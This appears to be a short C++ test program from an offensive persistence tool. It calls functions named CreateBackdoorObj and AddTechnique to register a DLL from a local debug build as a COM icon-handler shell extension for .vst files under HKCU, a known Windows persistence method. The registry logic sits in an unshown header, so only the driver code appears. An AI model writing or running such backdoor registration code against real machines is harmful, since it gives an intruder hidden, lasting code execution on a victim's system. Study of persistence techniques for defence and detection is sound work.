#include "reg.h"



int wmain()
{
	std::wstring dllPath = L"c:\\users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\Test004.4.dll";
	GUID guid = reg::CreateBackdoorObj(HKCU, dllPath);
	reg::AddTechnique(ICON_HANDLER, (WCHAR*)std::wstring(L".vst").c_str(), guid);

}
